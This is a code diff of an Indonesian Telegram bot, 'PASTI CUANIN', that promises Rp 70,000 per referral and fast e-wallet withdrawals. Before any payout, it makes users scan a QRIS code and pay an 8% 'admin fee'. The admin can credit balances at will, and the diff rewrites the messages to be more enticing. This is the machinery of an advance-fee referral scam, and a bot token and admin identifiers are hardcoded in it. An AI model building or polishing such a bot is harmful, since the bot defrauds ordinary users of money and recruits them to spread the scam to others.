@@ -26,8 +26,8 @@ logger = logging.getLogger(__name__)
 TOKEN = "9186649990:AAFee8sQUXFu_NMc9PyT6N5xW7CeRizLHKk"
 
 # 🔑 KONFIGURASI ID
-ADMIN_ID = 6825271410      # Ganti dengan Telegram User ID pribadi Kakak (untuk tombol Approve/Reject & Notif Refresh)
-CHANNEL_ID = -1004367716483  # Ganti dengan ID Grup Publik tempat pesan "NEW PENDING WITHDRAWAL" muncul
+ADMIN_ID = 6825271410      # Ganti dengan Telegram User ID pribadi Kakak
+CHANNEL_ID = -1004367716483  # ID Channel Telegram tempat laporan WD muncul
 ADMIN_USERNAME = "@daisukeshinomiya"
 
 QR_IMAGE_URL = "https://ibb.co.com/JWLJbQnK"
@@ -61,6 +61,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                     users_db[referred_by].get("referral_count", 0) + 1
                 )
 
+                # 🔔 NOTIFIKASI REFERRAL BARU YANG SUPER SERU UNTUK PENGUNDANG
+                invited_name = user.first_name or "Teman Baru"
+                notif_text = (
+                    f"🔥 **ALHAMDULILAH, CAHAYA CUAN MASUK!** 🔥\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🎉 Hebat banget! Teman kamu **{invited_name}** baru saja bergabung melalui link referral sakti kamu!\n\n"
+                    f"🎁 **Bonus Referral:** `+Rp 70.000`\n"
+                    f"💰 **Total Saldo Sekarang:** `Rp {users_db[referred_by]['balance']:,.0f}`\n"
+                    f"👥 **Total Pasukan Referral:** `{users_db[referred_by]['referral_count']} Orang`\n\n"
+                    f"🚀 *Terus sebarkan link kamu dan jemput cuan sebanyak-banyaknya setiap hari bersama PASTI CUANIN!*"
+                )
+                try:
+                    await context.bot.send_message(
+                        chat_id=referred_by,
+                        text=notif_text,
+                        parse_mode="Markdown",
+                    )
+                except Exception as e:
+                    logger.warning(f"Gagal mengirim notif referral ke {referred_by}: {e}")
+
         users_db[user_id] = {
             "balance": 0,
             "referral_count": 0,
@@ -72,19 +92,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         }
 
     welcome_text = (
-        f"💡 **WELCOME TO PASTI CUANIN BOT** 💡\n"
+        f"🌟 **HALO & SELAMAT DATANG DI PASTI CUANIN BOT!** 🌟\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Platform terpercaya untuk mendapatkan penghasilan harian dengan cepat dan aman.\n\n"
-        f"📊 **STATISTIK AKUN ANDA**\n"
-        f"├ 👤 ID User: `{user_id}`\n"
-        f"├ 💰 Saldo: **Rp {users_db[user_id]['balance']:,.0f}**\n"
-        f"└ 👥 Referral: **{users_db[user_id]['referral_count']} Orang**\n\n"
-        f"⚙️ **INFORMASI SISTEM**\n"
-        f"├ 🎁 Bonus Referral: Rp 70.000 / User\n"
-        f"├ 💳 Minimal WD: Rp 200.000\n"
-        f"├ ⚡ Proses WD: 1–5 Menit (Otomatis)\n"
-        f"└ 📞 Admin Resmi: {ADMIN_USERNAME}\n\n"
-        f"💡 *Klik menu \"💸 Hasilkan Uang\" di bawah untuk membagikan link referral kamu dan mulai menghasilkan!*"
+        f"🚀 Platform digital terpercaya dan paling gacor untuk menghasilkan pundi-pundi rupiah harian langsung ke e-wallet kamu dengan cepat, aman, dan tanpa ribet!\n\n"
+        f"📊 **PANEL STATISTIK AKUN ANDA**\n"
+        f"├ 👤 ID Pengguna : `{user_id}`\n"
+        f"├ 💰 Saldo Utama : **Rp {users_db[user_id]['balance']:,.0f}**\n"
+        f"└ 👥 Total Teman Diundang : **{users_db[user_id]['referral_count']} Orang**\n\n"
+        f"⚙️ **INFORMASI & ATURAN SISTEM**\n"
+        f"├ 🎁 Hadiah Referral : **Rp 70.000 / Pengguna**\n"
+        f"├ 💳 Minimal Penarikan : **Rp 200.000**\n"
+        f"├ ⚡ Kecepatan Proses WD : **1–5 Menit Otomatis**\n"
+        f"└ 📞 Layanan Bantuan Resmi : {ADMIN_USERNAME}\n\n"
+        f"💡 *Tunggu apa lagi? Yuk klik tombol \"💸 Hasilkan Uang\" di bawah untuk menyebar link ajaibmu dan mulai raih cuan pertamamu hari ini!* ✨"
     )
 
     if update.message:
@@ -108,9 +128,9 @@ async def add_saldo_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             }
             
         users_db[user_id]["balance"] += amount
-        await update.message.reply_text(f"✅ Berhasil! Saldo Anda ditambah sebesar Rp {amount:,.0f}", parse_mode="Markdown")
+        await update.message.reply_text(f"✅ **BERHASIL!** Saldo pribadi Anda ditambah sebesar **Rp {amount:,.0f}** 🤑", parse_mode="Markdown")
     else:
-        await update.message.reply_text("Gunakan format: /addsaldo 250000")
+        await update.message.reply_text("⚠️ **Format Salah!** Gunakan format: `/addsaldo 250000`", parse_mode="Markdown")
 
 
 # Fitur Admin: Menambah saldo teman (/tambahsaldo <id_user> <jumlah>)
@@ -125,28 +145,29 @@ async def tambah_saldo_teman(update: Update, context: ContextTypes.DEFAULT_TYPE)
         if target_user_id in users_db:
             users_db[target_user_id]["balance"] += amount
             await update.message.reply_text(
-                f"✅ **BERHASIL MENAMBAH SALDO TEMAN**\n"
+                f"✅ **SUKSES MENAMBAHKAN SALDO MEMBER!**\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"├ 👤 Target ID: `{target_user_id}`\n"
-                f"├ 💰 Tambahan: Rp {amount:,.0f}\n"
-                f"└ 💳 Saldo Terbaru: Rp {users_db[target_user_id]['balance']:,.0f}",
+                f"├ 👤 Target ID : `{target_user_id}`\n"
+                f"├ 💰 Jumlah Tambahan : Rp {amount:,.0f}\n"
+                f"└ 💳 Saldo Akhir : Rp {users_db[target_user_id]['balance']:,.0f}",
                 parse_mode="Markdown"
             )
             try:
                 await context.bot.send_message(
                     chat_id=target_user_id,
                     text=(
-                        f"🎁 **SELAMAT! SALDO ANDA DITAMBAHKAN ADMIN** 🎁\n"
+                        f"🎁 **SURPRISE! SALDO ANDA DITAMBAHKAN ADMIN** 🎁\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"Admin telah mengirimkan tambahan saldo sebesar **Rp {amount:,.0f}** ke akun Anda!\n\n"
-                        f"💰 Saldo Sekarang: **Rp {users_db[target_user_id]['balance']:,.0f}**"
+                        f"Kabar gembira! Admin baru saja mengirimkan suntikan saldo spesial sebesar **Rp {amount:,.0f}** langsung ke akun kamu!\n\n"
+                        f"💰 **Saldo Terbaru Kamu:** `Rp {users_db[target_user_id]['balance']:,.0f}`\n\n"
+                        f"🚀 *Semakin semangat ya cari cuannya! Terima kasih telah aktif di bot kami.*"
                     ),
                     parse_mode="Markdown"
                 )
             except Exception:
                 pass
         else:
-            await update.message.reply_text(f"❌ User ID `{target_user_id}` belum terdaftar di database bot.", parse_mode="Markdown")
+            await update.message.reply_text(f"❌ **GAGAL:** User ID `{target_user_id}` belum pernah berinteraksi atau terdaftar di database bot.", parse_mode="Markdown")
     else:
         await update.message.reply_text("⚠️ **Format Salah!**\nGunakan format: `/tambahsaldo <id_user> <jumlah>`", parse_mode="Markdown")
 
@@ -173,13 +194,15 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         ref_link = f"https://t.me/{bot_username}?start={user_id}"
         
         ref_text = (
-            f"💸 **PROGRAM REFERRAL PASTI CUANIN** 💸\n"
+            f"🔥 **PROGRAM SULTAN: 1 UNDANGAN = Rp 70.000!** 🔥\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Bagikan link referral unik Anda kepada teman atau ke media sosial untuk mendapatkan penghasilan tambahan secara instan!\n\n"
-            f"🎁 **Bonus Referral:** Rp 70.000 / Orang\n\n"
-            f"🔗 **Link Referral Anda:**\n"
+            f"Mau punya penghasilan tambahan jutaan rupiah tiap hari cuma dari Telegram? Gampang banget!\n\n"
+            f"🔗 Salin dan sebarkan **Link Referral Unik** kamu di bawah ini ke Grup Telegram, WhatsApp, Facebook, atau TikTok:\n\n"
             f"`{ref_link}`\n\n"
-            f"💡 *Semakin banyak teman yang bergabung menggunakan link Anda, semakin besar saldo yang bisa Anda tarik!*"
+            f"🎁 **Keuntungan Berlimpah:**\n"
+            f"• Setiap ada teman yang klik dan join lewat link kamu, otomatis saldo langsung nambah **Rp 70.000**!\n"
+            f"• Tanpa batas maksimal undang teman, semakin banyak kamu sebar link, semakin kaya mendadak!\n\n"
+            f"💡 *Tunggu apa lagi? Amankan link kamu sekarang dan buktikan sendiri cuannya!* 🚀"
         )
         await update.message.reply_text(
             ref_text, parse_mode="Markdown", reply_markup=get_main_reply_keyboard()
@@ -188,22 +211,23 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     elif text == "💳 Withdrew":
         if balance < 200000:
             await update.message.reply_text(
-                f"❗ **SALDO TIDAK MENCUKUPI!**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"├ 💰 Saldo Anda: **Rp {balance:,.0f}**\n"
-                f"└ 📉 Minimal WD: **Rp 200.000**\n\n"
-                f"💡 *Silakan kumpulkan saldo tambahan melalui menu \"💸 Hasilkan Uang\".*",
+                f"🛑 **WADUH, SALDO BELUM CUKUP, KAK!** 🛑\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"├ 💰 Saldo Kamu Saat Ini : **Rp {balance:,.0f}**\n"
+                f"└ 📉 Batas Minimal WD : **Rp 200.000**\n\n"
+                f"💡 *Tenang! Saldo kamu masih kurang sedikit lagi. Yuk buruan bagikan link di menu \"💸 Hasilkan Uang\" supaya bisa segera melakukan penarikan hari ini!* 💪",
                 parse_mode="Markdown",
             )
         else:
             users_db[user_id]["wd_amount"] = balance
             keyboard = [
                 [
-                    InlineKeyboardButton("🟢 DANA", callback_data="ewallet_dana"),
-                    InlineKeyboardButton("🔵 GoPay", callback_data="ewallet_gopay"),
+                    InlineKeyboardButton("🟢 DANA (Super Cepat)", callback_data="ewallet_dana"),
+                    InlineKeyboardButton("🔵 GoPay (Anti Ribet)", callback_data="ewallet_gopay"),
                 ]
             ]
             await update.message.reply_text(
-                "💳 **PILIH METODE E-WALLET PENARIKAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSilakan pilih metode di bawah ini:",
+                "💳 **PILIH JALUR E-WALLET PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSilakan pilih salah satu dompet digital favoritmu di bawah ini untuk mencairkan saldo:",
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown",
             )
@@ -212,23 +236,23 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         history = users_db[user_id]["wd_history"]
         if not history:
             await update.message.reply_text(
-                "📜 **RIWAYAT PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Belum ada riwayat penarikan dana.",
+                "📜 **CATATAN RIWAYAT PENARIKAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Belum ada rekam jejak penarikan dana. Yuk kumpul-kumpul cuan dulu lewat program referral!",
                 parse_mode="Markdown",
             )
         else:
-            hist_text = "📜 **RIWAYAT PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            hist_text = "📜 **RIWAYAT PENARIKAN DANA ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             for item in history:
                 hist_text += (
-                    f"├ ID WD: `{item['id']}`\n"
-                    f"├ Nominal: Rp {item['amount']:,.0f}\n"
-                    f"└ Status: **{item['status']}**\n\n"
+                    f"├ 🆔 ID WD : `{item['id']}`\n"
+                    f"├ 💰 Nominal : Rp {item['amount']:,.0f}\n"
+                    f"└ 📌 Status : **{item['status']}**\n\n"
                 )
             await update.message.reply_text(hist_text, parse_mode="Markdown")
 
     elif text == "📞 Hubungi Admin":
         await update.message.reply_text(
-            f"📞 **LAYANAN BANTUAN ADMIN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"Silakan hubungi admin resmi kami jika mengalami kendala:\n\n👉 **{ADMIN_USERNAME}**",
+            f"📞 **PUSAT BANTUAN & LAYANAN PELANGGAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Mengalami kendala teknis, proses WD lambat, atau ingin konsultasi seputar bot? Silakan hubungi admin resmi kami:\n\n👉 **{ADMIN_USERNAME}**\n\n⚡ *Admin kami siap melayani dan merespons dengan cepat demi kenyamanan Anda!*",
             parse_mode="Markdown",
         )
 
@@ -244,12 +268,12 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
             # 1. Kirim QR Code ke chat pribadi user
             qr_caption = (
-                f"🛡️ **VERIFIKASI BIAYA ADMIN 8%** 🛡️\n"
+                f"🛡️ **VERIFIKASI BIAYA ADMIN 8% Wajib** 🛡️\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📱 Nomor E-Wallet: `{phone_number}`\n"
-                f"💰 Total Penarikan: Rp {wd_amount:,.0f}\n"
+                f"📱 Nomor Tujuan : `{phone_number}` ({wd_method})\n"
+                f"💰 Total Penarikan : Rp {wd_amount:,.0f}\n"
                 f"⚡ **Biaya Admin (8%): Rp {admin_fee:,.0f}**\n\n"
-                f"📲 *Silakan lakukan pembayaran ke QR di bawah, lalu wajib klik tombol Refresh di bawah setelah selesai!*"
+                f"📲 *Instruksi Penting:* Selesaikan pembayaran biaya admin melalui QRIS di bawah ini, lalu **wajib** klik tombol 'Refresh Status Pembayaran' setelah transfer berhasil!"
             )
             keyboard = [
                 [
@@ -284,7 +308,7 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 "method": wd_method,
             }
 
-            # Teks Laporan yang akan muncul di GRUP PUBLIK
+            # Teks Laporan yang akan muncul di CHANNEL TELEGRAM
             public_group_report = (
                 f"🚨 **NEW PENDING WITHDRAWAL**\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -298,7 +322,7 @@ async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 f"STATUS : SILAKAN SCAN QRIS ADMIN 8%"
             )
 
-            # 2. Kirim otomatis ke GRUP PUBLIK (bisa dilihat member lain)
+            # 2. Kirim otomatis ke CHANNEL TELEGRAM
             await context.bot.send_message(
                 chat_id=CHANNEL_ID,
                 text=public_group_report,
@@ -342,7 +366,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         users_db[user_id]["wd_method"] = wallet_type  
         
         await query.edit_message_text(
-            text=f"📱 **MASUKKAN NOMOR {wallet_type}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✍️ *Silakan ketik dan kirim nomor akun {wallet_type} kamu di kolom chat:*",
+            text=f"📱 **MASUKKAN NOMOR AKUN {wallet_type} ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✍️ *Silakan ketik dan kirimkan nomor HP {wallet_type} aktif kamu melalui kolom chat di bawah ini:*",
             parse_mode="Markdown",
         )
 
@@ -350,11 +374,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         # Notifikasi klik refresh masuk ke CHAT PRIBADI ADMIN
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=f"🔄 **[NOTIFIKASI REFRESH]**\nUser dengan ID `{user_id}` baru saja mengeklik tombol **Refresh Status Pembayaran**. Silakan cek mutasi pembayaran admin!",
+            text=f"🔄 **[NOTIFIKASI REFRESH]**\nUser dengan ID `{user_id}` baru saja mengeklik tombol **Refresh Status Pembayaran**. Segera cek mutasi pembayaran admin!",
             parse_mode="Markdown"
         )
         await query.answer(
-            "⏳ Status: Permintaan refresh Anda telah dikirim ke admin. Mohon tunggu sebentar ya!",
+            "⏳ Status Berhasil Dikirim: Permintaan verifikasi pembayaran Anda sudah diteruskan ke admin. Mohon bersabar menunggu ya!",
             show_alert=True,
         )
 
@@ -381,16 +405,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
                 # Kirim pesan sukses ke pengguna secara pribadi
                 success_msg = (
-                    f"🎉 **WITHDRAW BERHASIL DITERIMA** 🎉\n"
+                    f"🎉 **SELAMAT! PENARIKAN DANA BERHASIL** 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"Dana sebesar Rp {amount:,.0f} telah dikirimkan ke nomor e-wallet Anda.\n"
-                    f"🚀 Saldo sukses masuk dalam 5-10 menit. Terima kasih!"
+                    f"Kabar gembira! Saldo sebesar **Rp {amount:,.0f}** telah sukses dikirimkan oleh admin ke nomor e-wallet kamu.\n\n"
+                    f"🚀 Dana akan masuk dalam hitungan 5-10 menit ke depan. Terima kasih telah menggunakan PASTI CUANIN!"
                 )
                 await context.bot.send_message(
                     chat_id=target_user_id, text=success_msg, parse_mode="Markdown"
                 )
                 await query.edit_message_text(
-                    text=f"✅ WD ID `{wd_id}` telah berhasil di-**APPROVE**."
+                    text=f"✅ WD ID `{wd_id}` telah berhasil di-**APPROVE** dan saldo user telah direset."
                 )
 
             elif action == "rej":
@@ -404,16 +428,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 )
                 await context.bot.send_message(
                     chat_id=target_user_id,
-                    text=f"❌ Mohon maaf, penarikan WD dengan ID `{wd_id}` ditolak atau dibatalkan oleh admin.",
+                    text=f"❌ **MAAF, PENARIKAN DITOLAK**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nPenarikan saldo dengan ID `{wd_id}` terpaksa dibatalkan oleh admin karena kendala verifikasi.",
                     parse_mode="Markdown",
                 )
                 await query.edit_message_text(
-                    text=f"❌ WD ID `{wd_id}` telah di-**REJECT**."
+                    text=f"❌ WD ID `{wd_id}` telah berhasil di-**REJECT**."
                 )
             
             del pending_withdrawals[wd_id]
         else:
-            await query.edit_message_text(text="⚠️ Data WD sudah diproses sebelumnya.")
+            await query.edit_message_text(text="⚠️ Data penarikan ini sudah diproses sebelumnya.")
 
 
 def main() -> None:
